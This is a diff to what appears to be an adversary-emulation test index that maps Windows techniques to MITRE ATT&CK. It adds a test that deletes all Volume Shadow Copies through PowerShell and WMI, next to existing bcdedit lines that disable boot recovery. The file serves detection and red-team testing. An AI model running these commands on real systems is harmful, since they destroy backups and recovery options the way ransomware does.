@@ -16096,6 +16096,19 @@ impact:
         command: |
           bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
           bcdedit.exe /set {default} recoveryenabled no
+    - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
+      description: "Deletes Windows Volume Shadow Copies with PowerShell code and
+        Get-WMIObject. \nThis technique is used by numerous ransomware families such
+        as Sodinokibi/REvil.\nExecutes Get-WMIObject \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | ForEach-Object
+          {$_.Delete();}"
+
+'
   T1496:
     technique:
       x_mitre_data_sources:
